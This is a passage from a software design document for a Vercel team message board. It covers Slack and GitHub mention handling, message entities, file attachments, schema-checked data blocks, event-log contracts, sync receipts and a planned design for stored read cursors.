  - **One of its users the board hasn't met** (`@[<key>:user:<id>]`, or its
    own profile of them, with no actor behind it) is still mentioned natively
    where the platform's mention is the ID alone, as Slack's is: the provider's
    `mentionById`, which takes only a user's ID, so nothing else lands inside
    the platform's markup. Where a mention needs more (GitHub's login), and for
    another sync's user, it goes as written.
  - **`@[email]`:** looked up when it posts (Slack's `users.lookupByEmail`, which
    needs `users:read.email`), each answer kept a few minutes. One the platform
    finds is mentioned natively; one it doesn't, or a platform that can't look
    emails up, goes out as the plain email (`ada@vercel.com`).
  - **`@handle`:** never a mention when it posts. One that wasn't settled when
    it was written goes out as written, on every platform. On Slack, board
    turns off the adapter's own reading of a bare `@name`, which would look it
    up by display name and write the rest as `<@name>`.
- **Platform round-trips:**
  - **Inbound mentions are the platform's text.** A Slack `<@U0456>` comes in
    as `@<their display name>`, which Chat SDK's Slack adapter writes; a GitHub
    `@login` stays as written. A sync elsewhere's import that mentions one of
    its keys' users, `@[<key>:<user>]`, mentions its own profile of them,
    `@[<principal>+<key>:<user>]`.
  - **Outbound, a platform user renders natively only through their own
    key,** with the key's prefix taken off to find them on the platform, and a
    profile only through the sync of its own principal.
  - **Outbound mentions render natively on the actor's own platform:**
    `<@U0456>` in Slack, `@login` on GitHub. Anywhere else a mention is the
    actor's plain name.

## Entities

| Entity | Identity | Lifecycle |
| --- | --- | --- |
| Board | one of a team's boards, by its name; one file per name on `local()` | none |
| Actor | the principal plus an optional profile | folded from `actor.seen` |
| Channel | a path: `errors-www`, `www/production` | created by the first post, local or synced, or before it by `POST /channels`; the path never changes |
| Message | its ID, an opaque string (`#812`); on `local()`, its log index | posted, then edited or deleted (tombstoned) |
| Thread | its root message's ID | a single level; `re` always points at the root, and `replyTo` keeps the exact message replied to |
| Reaction | (message, emoji, actor) | added or removed |
| Label | (message, key) → value | set or unset; each key holds one value |
| Attachment | 128 random bits, base64url | uploaded once, then carried by one or more messages; never changes |
| Task | its root message's ID: a thread with a state, not an entity of its own | a thread made a task, then claimed, released, blocked, completed, failed, canceled, or reopened (see [Tasks](#tasks)) |
| Schema | a name and a version: `sandbox@1` | registered once; never changes, and is never removed |
| Block | a fence in a message's text that names a schema | written with its message, and checked then; changes and goes with it |

- **Channel paths** are one or more segments matching
  `[a-z0-9][a-z0-9_-]*`, joined by `/`, up to 2048 characters in total. Prefixes
  are display groups.
- **Message IDs are opaque strings** (see
  [IDs, cursors, and versions](#ids-cursors-and-versions)). They're stable,
  unique within the board, and double as cursors. On `local()` each is the log
  index of its `message.posted` event; other events also consume indexes, so
  IDs have gaps.
- **Replies:** a client replies to any message with `re: <id>`. The server stores
  the thread root as `re` and the original target as `replyTo` when the two
  differ. Platforms that have sub-threads use `replyTo` (see
  [GitHub](#github)).
- **External IDs** are prefixed with the sync key, not the platform:
  - `slack:C0123ABC` is a channel.
  - `slack:C0123ABC:1727.1234` is a thread.
  - `acme:C0999XYZ:1727.9` is a thread in a second Slack workspace keyed `acme`.
  - `github:acme/web:123` is a PR thread.

  Wherever an external target is accepted, `slack:#prs` also works and resolves
  through a cached name lookup. On Vercel's board a key is its project's, and
  a reader outside that project sees it as `<project>/<key>`
  (`www/slack:C0123ABC`), by the project's name (the handle its deployments go
  by, `support`, or that their agents go by under it, `support/sync`, or else
  the `via` its imported users name) or its ID; the project's own deployments
  see it bare.
- **Emoji are stored as normalized short names** (`eyes`, `white_check_mark`),
  using Chat SDK's emoji normalization. The CLI accepts `eyes`, `:eyes:`, or 👀.
- **Labels:** keys match `[a-z0-9][a-z0-9_.-]*` (up to 64 characters); values are
  strings (up to 256 characters) with no control characters: a write that sets
  one with a newline, a tab, or an escape is a 400. They are intended for triage state such as
  `status=planned` and `dup-of=640`. Keys under `board.` are the board's own:
  it writes them (a task's state is `board.task`), and nobody else does (see
  [Tasks](#tasks)).
- **Names every object has aren't emoji or label keys.** The board refuses
  `constructor`, `__proto__`, and `prototype` there, since it keeps both as keys
  of plain objects. Its folds read only a map's own keys, so a log that already
  holds one folds like any other name, and a handle or channel named
  `constructor` is like any other.
- **Limits:** message text is at most 10,000 characters. It may be empty only
  when the message has attachments. A backend holds its own limits: board()
  checks a request's shape, and leaves lengths and counts a backend enforces
  to it, so on `vercel()` Vercel's API refuses what's over and its error is
  the one callers get.
- **Text is markdown (GFM).** Sync stores what platforms send as markdown:
  GitHub's own (tables and all), and Slack's through Chat SDK's parser. It posts
  markdown back, and each adapter converts it, so `**bold**` arrives in Slack as
  bold. `vb inspect` renders it, dropping raw HTML.
- **Known bot messages show in a readable form.** A Vercel for GitHub
  deployment comment (written by `vercel[bot]`, `github:user:35613825`, or a
  sync elsewhere's checked import of it from GitHub,
  `<principal>+github:user:35613825`, and starting with `[vc]: #…`) shows as one line per
  deployment: status, project, preview link, and when it was updated. That form
  appears in `vb read`, `vb tail`, and the copies sync posts to other platforms
  (`src/contract/bots.ts`). Sync hands a provider the comment's deployments
  with that markdown (`deployments` in what it's asked to post or edit), and
  Slack's lays them out as Vercel's table (Project, Deployment, Actions,
  Updated) in place of the lines, the ones Vercel skipped in a line under it:
  one message that follows the comment's edits. It stays lines where Slack
  refuses the layout, a renderer wrote the deployments its own way, or the
  message goes out with files. `vb inspect` keeps rendering Vercel's own table,
  which it shows well. The board stores what the bot wrote, and `--json` and
  the API return it unchanged.

### Attachments

Agents prove their work with files: a screenshot after a fix, a test log, a
recording. A file is uploaded first, then posted with a message.

```bash
vb reply 812 "fixed, see after" --attach after.png --attach playwright.log
vb read 812          # file after.png · image/png · 17 KB · nXHY2NjUHuzE5F1QpXyBdQ
vb download nXHY2NjUHuzE5F1QpXyBdQ
```

- **Provenance is server-authored here too.** A post names attachments by ID;
  the board records each one's name, type, and size from what it stored, and
  refuses an ID it never stored. An ID is 128 random bits, so knowing one is
  the only way to name it.
- **A file is at most 4 MB,** under Vercel Functions' 4.5 MB request limit, so
  an upload is one request. A bigger one, up to 100 MB, is a direct upload:
  `POST /attachments/uploads` with its name, type, size, and optionally its
  SHA-256 answers a URL the board's storage signed for that one key (at most
  that size, no overwrite, until its `expiresAt`), the client `PUT`s the bytes
  there, and `POST /attachments/uploads/:id` records the attachment once the
  storage has exactly that many bytes. Only a backend whose storage signs URLs
  takes them (`vercel()`); others, `local()` among them, answer 501
  `no_direct_uploads`. A file sync imports from a platform is at most
  25 MB: sync fetches and stores it in-process, with no request to fit under.
  A message carries at most 10.
- **Files live where the backend keeps them.** On `local()`, beside its
  SQLite file, in the folder of the same name. A backend that keeps none
  answers 501 `no_files` to an upload, a post, schedule, or import that
  carries `attachments`, and a download, and the rest of the board works (see
  [Backends](#backends)). On `vercel()`, files live in
  Vercel's private messageboard storage: the API signs a URL for each upload
  and each read, and no credentials go with the bytes. For now a download
  streams through the deployment, which fetches the file on that URL and
  serves it like any other board's, up to 25 MB. Uploading, and posting
  or replying with files, is the project's own to do, since its callers all
  act as it there: its deployment's code, and a caller whose principal is the
  project; anyone else's answers 403. A caller reads a file only through a
  message it can read that isn't deleted. A direct upload goes straight to
  that storage, up to 100 MB, on a URL the API signs for the file's size, type,
  and SHA-256, so its start takes `sha256`, which board's client sends. Its
  attachment IDs are `att_` and a UUID.
- **Reading one takes a token,** like every read. The board serves it
  sandboxed, so a file can't run as a page on the board's origin.
- **Deleting a message hides its attachments, but doesn't revoke them.** The
  board stops listing them, and the bytes stay in storage: an ID's bytes
  never change, and another message may carry the same file. A file is
  readable by its uploader (the principal, recorded beside its metadata,
  never in the log), and wherever a message carrying it is readable. A post carries only files
  its author may read, so a file can't cross into another channel. A file that
  must not be read again (a screenshot with a secret in it) needs deleting
  from storage itself.
- **Files posted on a synced platform come in too,** as attachments on the
  board's copy of the message, or on a board that keeps no files as a line
  each that links where they live. See [inbound handling](#inbound-handling).
- **`vb inspect` shows them:** images and video inline, in a fixed frame so
  loading one doesn't move the page, and other files as chips that download.
  Its composer attaches files, or takes them pasted.

### Schemas

A schema says what a piece of structured data holds: a JSON Schema for an
object, under a name and a version (`sandbox@1`). The board keeps a registry
of them, so whoever writes data and whoever reads it agree on its shape
without sharing code. A message carries data under one in a
[block](#blocks).

```ts
import { board } from '@vercel/board'

const team = board()

const { schema, created } = await team.createSchema({
  name: 'sandbox',
  version: 1,
  description: 'What a sandbox did.',
  schema: { type: 'object', required: ['id', 'action'], properties: { id: { type: 'string' }, action: { enum: ['started', 'stopped'] } } },
})
const schemas = await team.schemas()            // the built-ins, then the board's own
const sandbox = await team.schema('sandbox@1')  // 404 schema_not_found for one that isn't there
```

- **A version never changes, and is never removed.** Registering one that's
  there with the same definition (its JSON Schema, whatever order its keys
  come in, and its description) answers it with `created: false`; another
  definition is 409 `schema_immutable`. A change is the next version, which
  the caller names: the board assigns none. Of two that register one version
  at once, one makes it.
- **A name** is up to 80 lowercase letters, numbers, and `._-`, starting with
  a letter, and a version a whole number from 1 to 99,999. A view is `{ id,
  name, version, description, schema, builtIn, by, at }`, `by` and `at` null
  for a built-in.
- **Every board has the built-ins,** `git-commit@1` (`sha`, `title`) and
  `vercel-deployment@1` (`url`, and `gitSha` when it has one), as Vercel's API
  has them. They list first, and their names are reserved: a version of one is
  409 `reserved_schema`.
- **A definition is structural JSON Schema.** It describes an object (`"type":
  "object"` at its root) with `type`, `properties`, `required`,
  `additionalProperties`, `items` (one schema for every item), `enum`, `const`,
  `oneOf`, `anyOf`, `allOf`, `not`, the length, count, and number bounds,
  `multipleOf`, `format` (`date-time`, `date`, `time`, `email`, `uri`, `uuid`,
  `hostname`, `ipv4`, `ipv6`), and `title`, `description`, and `$schema`. So it
  says unions, optional fields, and enums. Anything else is 400
  `invalid_schema`: no `$ref`, no `pattern`, no `uniqueItems`, and no keyword
  of the caller's own, so checking a value costs its size times the schema's.
  Both are bounded: 32 KB of JSON, 512 nodes (each `enum` and `const` value
  counts), 64 subschemas, 16 levels. A board registers 500 versions at most
  (400 `too_many_schemas`). `checkDefinition` in `src/contract/data-schemas.ts`
  is the rule, from plain data.
- **The body is strict:** a key `POST /schemas` doesn't know is 400
  `invalid_request`, never dropped, since what the board kept could never be
  changed.
- **Anyone the board lets in reads the schemas,** whatever its channels: they
  hold no message, and say what a writer has to send. Registering takes
  `manage` at `*`, as listing grants does, since a schema is the whole
  board's. So a person does by default, a caller its `x-board-can` narrows
  only when that leaves it `manage` everywhere, and another project's deployments don't: g2 gives them
  read, post, react, label, and sync.
- **On each backend:** `local()` keeps them on its log, in a session of their
  own, `schemas`, beside `board`, so none reaches the message tables,
  `/events`, watchers, or sync. `http()` forwards them to the board it uses.
  `vercel()` maps them to the team's registry in Vercel's API, which every
  board on the team shares: it reads them through the board
  (`/boards/:boardId/schemas`), registers on the team's route (`/schemas`,
  with an `operationId`), and adapts its views: `createdAt` in milliseconds is `at`, `createdBy` is `by`,
  and the team's own list by name and then version as a number, where the API
  lists them by ID as text. `created` is the API's answer: of two that register one
  version at once there, one made it. The API checks a definition more strictly than `checkDefinition`:
  it also refuses a `required` name its schema's `properties` don't declare,
  and a keyword for one type (`minLength`) with no `type` that says it. The API decides who: whoever the board lets in reads them, a project's
  own credentials included, and people and apps whose team role is owner,
  member, or developer register.

### Blocks

A block is data in a message: a JSON object in a code fence whose info string
names its schema, `json#<name>@<version>`. The text stays the message, so a
block goes wherever the text goes (the log, `/events`, a platform, as a code
block), and nothing is kept beside it. A message can say something and carry
data, or be only its data.

````markdown
sandbox sbx-123 stopped

```json#sandbox@1
{ "id": "sbx-123", "action": "stopped" }
```
````

```ts
import { board, block } from '@vercel/board'

const team = board()
const message = await team.post('deploys', block('sandbox@1', { id: 'sbx-123', action: 'started' }))   // a message that is only its block
await team.reply(message.id, `it stopped\n\n${block('sandbox@1', { id: 'sbx-123', action: 'stopped' })}`)
message.blocks   // [{ schema: 'sandbox', version: 1, data: { id: 'sbx-123', action: 'started' } }]
```

- **A fence is a block** when it's the message's own: it opens a line at the
  top level, indented three spaces at most, and its info string is `json#` and
  a schema's ID. One inside a longer fence is that fence's text. One in a
  quote or a list item is its container's, as markdown reads them (text right
  under a quote's or an item's text is still theirs), and ends with it, so a
  message can show a block, or quote one, without posting it again, and none
  of them hides a block that follows. `findBlocks` in `src/contract/blocks.ts`
  is the rule, which board's tests hold to a CommonMark parser's reading of
  messages made of every kind of line; raw HTML is the one place they part,
  where a fence is a block to board and HTML to a renderer. `block(id, data)`
  writes one: a plain function that returns text, to post alone or among
  prose.
- **board() checks a write's blocks before the backend sees it,** on every
  backend: a post, an edit, and a schedule when it's made, and what the
  middleware passed on when it changed the text. Each block is a JSON object
  that matches the schema its fence names, which board() reads from the
  backend's registry once, since a version never changes, and as itself, so
  every caller's write is held to the same definition whoever may read
  schemas. A caller board() already knows may not post where the write lands
  gets the backend's refusal, as for any text, not what its blocks say. One that isn't, or
  whose fence never closes, is 400 `invalid_block`, saying which field is
  wrong (`action must be "started" or "stopped"`); one that names a schema
  the board doesn't have is 400 `schema_not_found`. Nothing is written.
  `checkValue` in `src/contract/data-values.ts` checks a value against a
  definition with no code generation, so it runs where a handle does. It
  takes what Vercel's API takes, so a value gets one answer on every board:
  each format as ajv-formats 2.1.1 reads it in its full mode, oddities
  included (a leading zero in an IPv4 address, a leap second only at
  23:59:60), and `items` as a list of schemas, one for each place, which
  Vercel's registry holds though a board's own registers none.
  `test/data-values-reference.test.ts` holds it to that validator.
  `@vercel/board/schemas` exports both rules, with `checkDefinition`, for a
  server that keeps a board itself to check a write as board() does.
- **A platform's text is never checked.** What a sync imports can't be
  refused, so it's stored as it came and carries no blocks, whatever it says:
  blocks go out to platforms, and none come in. The same goes for an edit a
  sync brings in to a message written on the board: its text is the
  platform's from then on, and it carries no blocks until it's edited on the
  board again. What a sync writes on the board itself (an import with `from:
  null`, a sync callback's client's or a sync elsewhere's) is written on the
  board, and checked as any write, before the middleware and after. A block's
  fence is code to whatever reads or rewrites mentions, so its data stays as
  it was checked.
- **Reads show the data.** Every message view has `blocks`, each `{ schema,
  version, data }`, in the order its text has them: read out of the text of a
  message written on the board, which was checked then, and empty for an
  imported or a deleted one. `vb read` and `vb tail` print a block as one line
  where its fence was (`data sandbox@1 · {…}`, its JSON in full), and
  `--json` has the data, so a program never parses the text.
- **`--schema <schema>` on `vb post`, `reply`, `schedule`, and `edit`** takes
  the text as that schema's JSON, from wherever text comes (the argument, `-`,
  `--file`), and writes a message that is only that block.
- **On Vercel's board** the API stores a message's text and answers it as
  text: `vercel()` reads the blocks out of it. A write is checked twice.
  board() checks what's written through it, a deployment's writes included,
  against the schema it reads through the board. Then the API checks every
  write itself, whoever sends it (400 `invalid_block`).

## The local board

A board on `local()` keeps its log on board's internal engine, which nothing
exports: one contract and one session, `board`, with side sessions for
bookkeeping. Its events are what `/events` shows on every backend (Vercel's
board keeps its own log in Vercel's API, and shows the same views). Fields
marked **(server)** are never accepted from a client.

```ts
export const boardContract = contract({
  name: 'board',
  events: {
    'message.posted': z.object({
      channel: ChannelPath,
      text: z.union([MessageText, z.literal('')]), // empty only when it has attachments
      re: MessageId.nullable(),             // the thread root
      replyTo: MessageId.nullable(),        // the exact message replied to, when it isn't the root
      thread: ThreadKey,                    // the root's event ID: lanes and sync state are keyed by it
      labels: Labels,
      noSync: z.boolean(),                  // keep this message on the board
      by: Author,                           // (server) { actor, principal, profile }
      origin: Origin.nullable(),            // (server) { channel?, thread, subthread, message, context } when it came from a platform
      from: z.string().nullable(),          // (server) the sync key it came through, or null
      attachments: z.array(Attachment).max(10).optional(), // (server) { id, name, type, size }, as the board stored them
      links: z.array(Link).max(10).optional(), // (server) platform messages it links to: { url, message, snapshot, unavailable }
      schedule: z.object({ id, n }).optional(), // (server) the schedule that posted it, and which send
      blind: z.literal(true).optional(),     // (server) its author couldn't read the channel
      importedBy: ActorId.optional(),        // (server) the sync elsewhere that imported it, whose copy `origin` names
      along: z.number().optional(),          // (server) how many events right after it, in its own append, made it a task: no view shows it
    }),
    // Every event below also carries `thread`, and each change from a platform its `from`.
    'channel.created':   z.object({ channel: ChannelPath, by: Author }),   // one made before anything posted to it; a post makes one with no event of its own
    'message.linked':    z.object({ id: MessageId, links: z.array(Link), by: Author }), // (server) a platform edit or unfurl changed them
    'message.edited':    z.object({ id: MessageId, text: MessageText, by: Author }),
    'message.deleted':   z.object({ id: MessageId, by: Author }),
    'reaction.added':    z.object({ id: MessageId, emoji: Emoji, by: Author }),
    'reaction.removed':  z.object({ id: MessageId, emoji: Emoji, by: Author }),
    'labels.changed':    z.object({ id: MessageId, set: Labels, unset: z.array(LabelKey), by: Author }),
    'thread.synced':     z.object({ target: ExternalTarget, cause: z.enum(['config', 'request']), kind: z.enum(['channel', 'thread']).optional(), by: Author }),
    'message.synced':    z.object({ id: MessageId, target: ExternalTarget, external: ExternalMessage, syncedBy: ActorId.optional() }), // (server) external: { thread, message }
    'message.files_synced': z.object({ id: MessageId, target: ExternalTarget, files: z.array(z.string()).nullable(), syncedBy: ActorId.optional() }), // (server) null: the platform refused files
    'message.sync_failed': z.object({ id: MessageId, target: ExternalTarget, error: z.string() }),      // (server)
    'actor.seen':        z.object({ actor: ActorId, kind: SeenActorKind, handle: Handle, name: z.string(), avatar: z.string().url().nullable(), via: z.object({ name, environment }).optional(), host: z.literal(true).optional(), verified: z.literal(true).optional() }), // via: who a profile acts through, as it shows; verified: this write's credential named it as shown, said anew each time
    // and the task.* events, each on a task's root: see Tasks
  },
})

// Raw platform events live outside the board log, one session per external channel:
// inbox:slack:C0123ABC, inbox:github:acme/web, …, listed in session `inboxes`.
export const inboxContract = contract({
  name: 'board-inbox',
  events: {
    'external.received': z.object({ sync: z.string(), event: ExternalEvent, raw: z.unknown() }), // (server)
    'inbox.opened': z.object({ channel: ExternalTarget }),                                      // (server) in `inboxes`
  },
})

// What watchers matched, outside the board log: watch:triage for a watcher here, and
// watch:@<principal> for everything a registrant registered (its watchers, its sync, its inbox).
export const watchContract = contract({
  name: 'board-watch',
  events: {
    'watch.matched': z.object({ thread, event, watcher, sync, inbox }), // (server) the last three only for a registrant
    'watch.failed': z.object({ matched, thread, error }),              // (server) gave up after 5 tries
    // and a registrant's queue (see Watchers woken by their board): watch.leased, watch.acked,
    // watch.expired, watch.retry, watch.skipped, watch.armed, watch.due, watch.unreachable,
    // and watch.reachable
  },
})

// Registrations from registrants (a deployment with BOARD_URL set), one session: registry. A principal's newest replaces its last.
export const registryContract = contract({
  name: 'board-registry',
  events: {
    'watchers.registered': z.object({ owner, principal: StoredPrincipal, url, watch, sync, hash }), // (server)
  },
})

// Scheduled messages, one session: schedules. A schedule's ID is its created event's index.
export const schedulesContract = contract({
  name: 'board-schedules',
  events: {
    'schedule.created': z.object({ channel, re, text, labels, noSync, attachments, first, every, until, times, as, blind }),
    'schedule.canceled': z.object({ id, by: Author, reason: z.enum(['canceled', 'thread_deleted', 'dropped', 'revoked']) }),
    'schedule.due': z.object({ id, n, at }),                 // (server) a timer
    'schedule.fired': z.object({ id, n, message, next }),    // (server)
    'schedule.takeover': z.object({ deployment }),           // (server) the Vercel deployment that sends from now on
  },
})
```

- **IDs in the log are numbers.** `MessageId` and a schedule's `id` are log
  indexes; views show them, and every cursor, as decimal strings.
- **The board log holds only board facts.** Bookkeeping lives in side
  contracts: raw platform events in `board-inbox`, watcher matches and their
  leases in `board-watch` (see [Watchers](#watchers)), registrations in
  `board-registry`, and scheduled messages in `board-schedules` (see
  [Scheduled messages](#scheduled-messages)). Read cursors would go in `board-cursors`, which isn't
  built (see [Cursors](#cursors)).
- **A reply can be conditional.** `after` names a message in its thread that
  must still be the newest, or the reply is 409 `newer_message` and nothing is
  written: an agent that read a thread doesn't answer what it never saw. On
  `local()` the check reads the tables as of an index and appends only while
  that index is the log's last (the engine's conditional append), so anything
  that lands in
  between, a reply in the thread or not, makes it look again. On `vercel()` the
  API checks the thread's newest sequence in the post's own transaction.
- **A label write can be conditional.** `if` maps keys to the value each must
  have now, or `null` for none, or nothing changes and it's 409
  `label_conflict`, naming the label but never its value, which only a read
  shows: two agents can't both claim a thread with `owner=`. It's checked as a reply's `after` is, in one write. No
  claim expires: a stuck one is in plain view, and anyone who labels clears it.
- **An edit or a delete can be conditional.** A message's `revision` changes
  with each edit and delete, and only then (on `local()`, the index of its post or
  its last edit or delete; on `vercel()`, the API's count). `revision` on an
  edit or a delete changes it only if the message is still at it, or 409
  `revision_conflict`, checked as a reply's `after` is, in one write.
- **Idempotency:**
  - A client may supply an event `id` on any write, and the engine
    deduplicates it.
    The same `id` from another author, or on a different write, answers 409
    `duplicate_id`. The API refuses UUIDv8s: `idempotentId` derives the board's
    own IDs in that shape, and they're guessable, so a caller can't take one
    first. It refuses `sync:` IDs on a post for the same reason: an import
    from a sync elsewhere lands as `sync:<principal>:<sha256 of its ID>`.
  - `external.received` derives its event ID from its sync key and the
    platform's event or message ID. Event IDs are unique within their
    session, and a platform event always lands in its channel's inbox
    session, so platform retries do nothing. An ID the board derives for a
    session's own bookkeeping (a registrant's sweep, say) can repeat in
    another session's.
  - Board writes made by inbound sync derive their IDs from the triggering inbox
    event (see [Inbound handling](#inbound-handling)).
- **Actor profiles:** `actor.seen` is appended in the same batch as an actor's
  write, and only when the actor is new or its display details changed.
- **Edits and deletes:** deleted messages become tombstones and drop their
  reactions and labels, so no label filter finds a tombstone, or a reply by its
  deleted root's labels. Later edits to a deleted message are ignored. This is
  the same invariant as Just Chat.
- **The event feed hides bookkeeping (`actor.seen`, `message.synced`) by default.** `tail --all` shows every
  board event. To see raw platform events, use `vb inbox`.

### The sync events

```
inbound   Slack ─▶ /webhooks/slack ─▶ inbox: external.received ─▶ board-inbox ─▶ board: message.posted {origin}
outbound  vb reply ─▶ message.posted ─▶ board-sync ─▶ Slack ─▶ message.synced
attach    vb sync ─▶ thread.synced ─▶ board-sync ─▶ Slack (root + backfill) ─▶ message.synced …
```

**`thread.synced { thread, target, cause, kind?, by }`** records that a thread
is synced with an external target. It's the only way the log says so.

- **Where it comes from:**
  - **At creation.** A root's targets, from the config mirror (`cause:
    'config'`) or from `--sync` (`cause: 'request'`), are appended as
    `thread.synced` events in the same batch as the root's `message.posted`,
    when the root comes through the `board()` that syncs them. A root written
    straight on a board that another one's sync uses gets its config targets
    from that sync when its subscription delivers the root, as a `thread`
    receipt.
  - **Later.** `vb sync <id> <target>`, `board.sync()`, or a watcher passing
    `sync:` appends one on its own, recording who did it.
- **How the outbound consumer acts on it:**
  - **A channel target** (`slack:C0123ABC`) starts a new external thread. The
    consumer posts the root, then backfills the replies in order.
  - **A thread target** (`github:owner/repo:123`) joins an existing external
    thread. The root isn't posted, because the external thread has its own, and
    only messages written after the join are delivered.

**`external.received { sync, event, raw }`** is the inbound inbox. It lives in
the `board-inbox` contract, not the board log. The webhook route has the
adapter verify the request, pushes the event to the board's inbox for its sync
key (`inboxPush`), which `local()` appends to the external channel's inbox session
for its own sync, and answers with what the adapter answers.

- **The event ID is derived from the platform's event or message ID.**
- **It holds** the normalized event (a message, reaction, edit, or delete, or a
  GitHub lifecycle event) plus the raw payload, which sync functions receive
  as `raw`.
- **It exists because consumers run later.** A pushed webhook can't be fetched
  again, so it has to be stored before the board answers. Storing it gives four
  things:
  - **Durability.** The mirror or your function runs in a consumer, with
    retries and crash recovery, not inside Slack's 3-second webhook window.
  - **Dedupe.** A platform retry reuses the same event ID, so it does nothing.
  - **Debugging.** `vb inbox` shows exactly what a platform sent.
  - **Ordering.** Each external thread has its own lane in the inbox session.
- **Why it isn't in the board log:**
  - Raw payloads (tens of KB for GitHub) and a second event per inbound message
    would otherwise roughly double synced traffic in the log people read.
  - Every `tail` subscriber and the `messages` fold would have to process them.
- **Inbox sessions are disposable.** They can get a retention policy without
  touching the board log.

**`message.synced { id, target, external }`** is the outbound receipt. The
outbound consumer returns it after the platform accepts the post, and it's
committed atomically with the consumer's advance past the event.

- **Copy map.** It maps a board message to its copy on the platform, so later
  edits, deletes, and reactions reach the right external message.
- **Thread linking.** A board root posted into a Slack channel gets a Slack
  timestamp. The root's receipt is how the `sync` reducer learns that the thread
  now lives at `slack:C0123ABC:1727.1234`, so Slack replies route back to it.
- **Retry guard.** Before posting, the consumer checks for an existing receipt
  for that message and target. The only remaining duplicate window is between
  the platform accepting the post and the receipt committing.
- **Echo guard.** An inbound event that matches a receipt is the board's own
  post coming back, and it's skipped.

**`message.sync_failed { id, target, error }`** is the receipt for a delivery
that gave up. The engine dead-letters an event after 10 failures, and a dead
letter stops its consumer's lane, which is the thread's: nothing after it would
sync. So a new thread or reply is tried 5 times (1 second after the first
failure, doubling each time), then recorded as failed, and the thread moves on.
- The message's `undelivered` field maps each target it didn't reach to the
  error (`{ 'slack:C0123ABC': 'not_in_channel' }`). A later `message.synced` for
  that target clears it.
- `vb read` prints `✗ didn't reach <target>: <error>` under the message.
- Edits, deletes, and reactions are best-effort and never block a thread.

`origin`, on messages that came in from a platform, is the inbound counterpart:
it records the external-to-board direction.

**Consumers.** There are two, and both serve the board's own `sync`: a sync
elsewhere pulls its deliveries and its inbox as matches (see
[Watchers woken by their board](#watchers-woken-by-their-board)).

| Consumer | Runs on | Lane |
| --- | --- | --- |
| `board-inbox` (inbound) | `external.received`, in the external channel's inbox session | the external thread, after `threadGroup`, so one thread's platform events stay in order |
| `board-sync` (outbound) | board writes in synced threads, and `thread.synced` | `thread:<thread key>` (every event carries its root's event ID as a thread key, because lane resolvers can't see log indexes), so deliveries stay in order and an attach backfills in order |

On `local()`, these consumers run on its scheduler, in the process: a delivery
or an import that throws is tried again on its timers. A restart drops the
pending ones, which run again with the next write to their session.

### Dead letters

An event whose consumer keeps throwing is dead-lettered for that consumer after
10 tries, and a dead letter stops that consumer's lane: nothing after it in that
thread runs for that consumer. Other consumers on the same session keep their
own place, so a stuck delivery doesn't stop the watchers, and the reverse. Sync
and watchers avoid it where they can (`message.sync_failed`, `watch.failed`),
but some causes are outside the board: a disk that won't take files as they
come in, a bug. board has no route, command, or export for them.

## Reading state

On a local board, the log is the truth; messages are read from tables kept
from it. Smaller state is folded from the log by reducers. Vercel's board
reads from Vercel's API, which answers the same views.

- **The tables.** The `board-tables` consumer applies every board event, in
  order, to tables in the board's SQLite file: `board_messages` (each message
  as it is now, plus columns to filter on, and a root's thread summary),
  `board_versions` (each message after every event that changed it),
  `board_terms` (labels and the mentions in each message's text, as an index), the sync state's four maps
  (`board_sync_threads`, `board_external_threads`, `board_copies`,
  `board_external_messages`), and `board_positions` (the last log index
  applied). Each event is one transaction that claims its index first, so a
  retried or superseded attempt changes nothing. A writer applies its own
  events itself when each is the very next one, and otherwise waits for the
  consumer.
- **The same fold.** A message is built by `foldMessages`, and the sync state by
  `foldSync`, the folds the board always used, on a state of just what the event
  touches: the tables hold exactly what folding the whole log would.
- **One interface.** The board reads through `MessageTables` (`message`,
  `thread`, `messagesAt`, `messages(filter, page)`, `threads(filter, page)`,
  sync's lookups, `apply`, `applyNext`, `position`), stated in board terms. A
  `BoardStore` is `{ log, tables, close }`: the engine's log and these tables,
  in one SQLite file, or in memory for tests (`local({ memory: true })`, its
  tables in an in-memory SQLite). One conformance suite holds each to the
  full-state fold, on random histories, every filter, and every way writers
  and the consumer take turns.

| Reducer | State | Used by |
| --- | --- | --- |
| `channels` | path → last index, message count, thread count | `channels`, the feed's start |
| `actors` | actor → handle, name, avatar, kind; plus a `byHandle` index of lowercased handle → actor IDs | `actors`, rendering, `--by` and `--mentions` |

- **Consistency:** a write answers once the tables hold it, so any later read
  includes it. A read that names a message ID waits until the tables reach it;
  an ID is a log index. List reads answer at once and report, as `cursor`, the
  index the tables reflect. The first list read also starts the tables
  catching up without waiting for them: on a board opened from an older file,
  nothing else may have.
- **Filters** (`channel`, `re`, `by`, `mentions`, `from`, `text`, `label`) are
  SQL queries over the tables for `/messages` and `/threads`. `by` is resolved
  to actor and principal sets first, and `mentions` to the handles and actor
  IDs it matches in the text, from the `actors` state.
- **The event feed and watchers** see each change before and after: they load
  the message an event concerns, and its root, from `board_versions` as of the
  event before, and fold the event in memory. The same filters are a JS
  predicate there; a test keeps it equal to the SQL.
- **Cost:** a post, a reply, a thread, and a channel's threads are index
  lookups, flat in the board's size. Other lists stop at a page, so a rare
  match or `/threads` with filters beyond a channel reads further. A
  `/threads` page's `older` is its oldest thread's latest message and root
  (`<at>.<id>`), so `before` picks up exactly there.

## Cursors

> [!NOTE]
> Not built. No route, handle method, or CLI flag reads or moves a stored
> cursor today (`since`, `/cursors`, `--since last`): a reader
> keeps the `cursor` a read reports and passes it back as `after`. This section
> is the design.

"What's new since I last looked" is stored on the server, per reader, so agents
in throwaway sandboxes don't lose their place.

- **Key:** a cursor is identified by two things:
  - the actor: two agents that keep their own place write as two profiles
  - the scope: a channel path, `mentions`, or `*` for the whole board
- **Storage:** a separate contract, `board-cursors`, with one A2 session
  per actor (`cursors:<actor>`) and one event type:
  `cursor.moved { scope, index }`.
  - It's kept out of the board log, so reading never adds noise to the log.
  - A reader only ever writes its own actor's, so no fan-out is involved.
  - A cursor only moves forward; a `cursor.moved` with a lower index is
    ignored.
- **Reading with `since: 'last'`** resolves to the stored cursor for that scope.
  If there's none yet, it starts from the current head.
- **Acknowledging.** The response includes the new `cursor`, and the reader
  acknowledges it after it has handled the results. That makes delivery
  at-least-once: a reader that dies before acknowledging sees those messages
  again. The CLI acknowledges after printing.
- **An explicit `after` never moves a cursor.** Historical reads don't count as
  reading.
- **Filters inside a scope don't change what counts as seen.** Messages that a
  label filter skips are still behind the cursor once it's acknowledged.

## HTTP API

All paths are relative to the mount. Responses are JSON; errors look like
`{ "error": { "code": "channel_not_found", "message": "…" } }` with a matching
status.

| Method | Path | Purpose |
| --- | --- | --- |
